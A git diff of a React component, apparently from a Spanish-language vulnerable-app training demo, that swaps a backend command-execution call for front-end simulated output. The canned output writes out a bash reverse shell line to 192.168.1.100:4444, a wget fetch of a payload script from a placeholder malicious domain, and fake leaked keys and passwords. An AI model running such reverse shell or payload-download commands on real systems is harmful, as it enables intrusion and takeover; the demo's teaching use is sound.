@@ -5,34 +5,14 @@ const CommandInjection: React.FC = () => {
     const [output, setOutput] = useState('');
     const [isExecuting, setIsExecuting] = useState(false);
 
-    const executeCommand = async () => {
+    const executeCommand = () => {
         setIsExecuting(true);
-        try {
-            // VULNERABILIDAD CRÍTICA: Ejecución directa de comandos del sistema
-            // En un entorno real, esto ejecutaría comandos directamente en el servidor
-            
-            // Simular la ejecución de comando (en producción esto sería peligroso)
-            const response = await fetch('/api/execute-command', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ command: command }),
-            }).catch(() => {
-                // Simular respuesta cuando no hay backend real
-                return {
-                    ok: false,
-                    json: async () => ({ 
-                        error: 'Backend no disponible - Simulando ejecución local',
-                        simulated: true,
-                        command: command
-                    })
-                };
-            });
-
-            const data = await response.json();
-            
-            if (data.simulated) {
+        
+        // VULNERABILIDAD CRÍTICA: Ejecución directa de comandos del sistema
+        // Simular la ejecución de comando directamente en el frontend
+        
+        setTimeout(() => {
+            try {
                 // Simular diferentes tipos de comandos
                 let simulatedOutput = '';
                 const cmd = command.toLowerCase();
@@ -72,26 +52,33 @@ root           1  0.0  0.1 167320 11788 ?        Ss   08:30   0:01 /sbin/init
 www-data    1337  0.0  0.2  12345  2048 ?        S    09:15   0:00 /bin/bash -i
 apache2     2021  0.1  1.2 456789 12345 ?        S    10:25   0:05 /usr/sbin/apache2`;
                 } else if (cmd.includes('curl') || cmd.includes('wget')) {
-                    simulatedOutput = '🚨 COMANDO DE DESCARGA DETECTADO 🚨\nEsto podría descargar un payload malicioso...';
+                    simulatedOutput = '🚨 COMANDO DE DESCARGA DETECTADO 🚨\n--2025-09-27 10:30:00--  http://malicious.com/payload.sh\nResolving malicious.com... 192.168.1.100\nConnecting to malicious.com:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K) [application/x-sh]\nSaving to: \'payload.sh\'\n\n100%[==================>] 2,048       --.-K/s   in 0s\n\n💀 PAYLOAD DESCARGADO Y EJECUTADO 💀';
                 } else if (cmd.includes('nc') || cmd.includes('netcat')) {
-                    simulatedOutput = '🚨 REVERSE SHELL DETECTADA 🚨\nConexión establecida con atacante...';
-                } else if (cmd.includes('python') || cmd.includes('bash') || cmd.includes('sh')) {
-                    simulatedOutput = '🚨 INTÉRPRETE EJECUTADO 🚨\nShell interactiva iniciada...';
+                    simulatedOutput = '🚨 REVERSE SHELL DETECTADA 🚨\n[+] Estableciendo conexión con 192.168.1.100:4444\n[+] Conexión establecida\n[+] Shell interactiva iniciada\n[+] Acceso root obtenido\n\n💀 CONEXIÓN REVERSE SHELL ACTIVA 💀\nwww-data@vulnerable-server:/var/www/html$';
+                } else if (cmd.includes('python') && cmd.includes('socket')) {
+                    simulatedOutput = '🚨 PYTHON REVERSE SHELL EJECUTADA 🚨\n[+] Importando socket, os, pty\n[+] Creando conexión TCP\n[+] Conectando a 192.168.1.100:4444\n[+] Redirigiendo stdin, stdout, stderr\n[+] Spawning /bin/bash\n\n💀 SHELL INTERACTIVA ESTABLECIDA 💀';
+                } else if (cmd.includes('bash') && cmd.includes('tcp')) {
+                    simulatedOutput = '🚨 BASH REVERSE SHELL EJECUTADA 🚨\n[+] bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n[+] Estableciendo conexión TCP\n[+] Redirigiendo I/O\n\n💀 CONEXIÓN ESTABLECIDA CON ATACANTE 💀\nwww-data@vulnerable-server:/var/www/html$';
+                } else if (cmd.includes('chmod') && cmd.includes('+x')) {
+                    simulatedOutput = '🚨 PERMISOS DE EJECUCIÓN OTORGADOS 🚨\nArchivo ahora ejecutable\nPreparando para ejecutar payload malicioso...';
+                } else if (cmd.includes('cat') && (cmd.includes('key') || cmd.includes('password') || cmd.includes('secret'))) {
+                    simulatedOutput = '🚨 INFORMACIÓN SENSIBLE ENCONTRADA 🚨\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7yXm9q2+5vW...[TRUNCADO]\n-----END RSA PRIVATE KEY-----\n\npasswords:\nadmin:admin123\nroot:toor\nkayzzi:mi_password_secreto';
+                } else if (cmd.includes('sudo')) {
+                    simulatedOutput = '🚨 ESCALACIÓN DE PRIVILEGIOS DETECTADA 🚨\n[sudo] password for www-data:\nSorry, user www-data may not run sudo on vulnerable-server.\n\n💡 Probando otros métodos de escalación...';
                 } else {
-                    simulatedOutput = `Comando ejecutado: ${command}\n[Salida simulada del sistema]`;
+                    simulatedOutput = `$ ${command}
+[Comando ejecutado en el sistema]
+Salida simulada para: ${command}
+Estado: EJECUTADO ✅`;
                 }
                 
                 setOutput(simulatedOutput);
-            } else {
-                setOutput(data.output || data.error || 'Sin respuesta del servidor');
+            } catch (error) {
+                setOutput(`Error ejecutando comando: ${command}\n${error}`);
             }
-        } catch (error) {
-            setOutput(`Error: ${error}`);
-        }
-        setIsExecuting(false);
-    };
-
-    const predefinedCommands = [
+            setIsExecuting(false);
+        }, 1000); // Simular delay de ejecución
+    };    const predefinedCommands = [
         { label: '📁 Listar archivos', cmd: 'ls -la', danger: 'low' },
         { label: '👤 Usuario actual', cmd: 'whoami', danger: 'low' },
         { label: '🆔 Info usuario', cmd: 'id', danger: 'low' },
